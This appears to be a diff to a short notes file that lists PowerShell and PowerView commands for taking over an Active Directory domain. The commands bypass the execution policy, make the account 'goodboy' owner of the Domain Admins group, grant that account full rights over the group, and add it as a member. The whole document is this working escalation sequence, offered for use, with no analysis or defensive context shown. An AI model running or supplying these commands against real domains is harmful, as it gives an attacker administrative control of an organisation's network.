@@ -2,9 +2,13 @@
 -----------------------------------------------------------------------
 # Commands
 >powershell -ep bypass
->Import-Module .\PowerView.ps1\ 
+
+>Import-Module .\PowerView.ps1
+
 >Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'goodboy'
+
 >Add-DomainObjectAcl -Rights 'All' -TargetIdentity "Domain Admins" -PrincipalIdentity "goodboy"
+
 >net group "domain admins" goodboy /add /domain
 
 ------------------------------------------------------------------------------------------------------------
